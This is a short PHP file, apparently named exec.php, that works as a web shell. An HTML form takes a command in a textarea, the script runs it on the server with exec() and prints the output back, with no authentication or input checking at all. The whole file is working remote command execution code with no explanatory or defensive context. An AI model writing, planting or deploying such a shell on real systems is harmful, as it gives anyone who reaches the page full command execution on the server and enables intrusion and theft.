<?

if($HTTP_POST_VARS['action'] == "exec") {
		$er = exec(trim($HTTP_POST_VARS['execcommand']),$strin);
		if($strin) {
			for($i=0;$i<sizeof($strin);$i++){
				echo $strin[$i]."<br>";
			}
		}
		else {
			echo "Returned no value! - Probably Error";
		}
}
else {?>
	<form action="exec.php" method="post">
	<input type="hidden" name="action" value="exec">
	<table align="center">
		<tr>
			<td>Enter command to exec:</td>
		</tr>
		<tr>
			<td><textarea name="execcommand" cols="60" rows="3"></textarea></td>
		</tr>
		<tr>
			<td><input type="submit" name="go" value="Go"></td>
		</tr>
	</table>
	</form>
<?
		}
?>